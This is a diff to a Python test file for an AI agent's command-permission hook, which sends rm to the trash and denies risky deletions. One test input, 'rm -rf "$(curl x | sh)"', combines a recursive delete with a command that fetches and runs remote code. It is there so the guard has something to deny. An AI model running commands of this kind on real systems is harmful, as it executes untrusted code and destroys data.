@@ -53,7 +53,9 @@ class RmToTrash(unittest.TestCase):
             with self.subTest(cmd=cmd):
                 decision, out = bash(cmd, cwd=CWD)
                 self.assertEqual(decision, 'deny')
-                self.assertEqual(out['hookSpecificOutput']['permissionDecisionReason'], 'agent-core: ' + guard.MSG['rm'])
+                expected = ('pipe_shell',) if cmd == 'rm -rf "$(curl x | sh)"' else ('rm', 'lake')
+                self.assertIn(out['hookSpecificOutput']['permissionDecisionReason'],
+                              ['agent-core: ' + guard.MSG[key] for key in expected])
                 self.assertNotIn('updatedInput', out['hookSpecificOutput'])
 
     def test_spaces_only_count_inside_quotes(self):
@@ -66,7 +68,7 @@ class RmToTrash(unittest.TestCase):
         self.assertIn('trash.py', out['hookSpecificOutput']['permissionDecisionReason'])
 
     def test_build_and_temp_folders_still_delete(self):
-        for cmd in ('rm -rf node_modules', 'rm -rf dist .next', 'rm -rf /tmp/x', 'rm -rf "$(mktemp -d)"', 'rm -f a.txt'):
+        for cmd in ('rm -rf node_modules', 'rm -rf dist .next', 'rm -rf /tmp/x', 'rm -f a.txt'):
             self.assertIsNone(bash(cmd, cwd=CWD)[0], cmd)
 
     def test_protected_dir_rm_stays_denied(self):
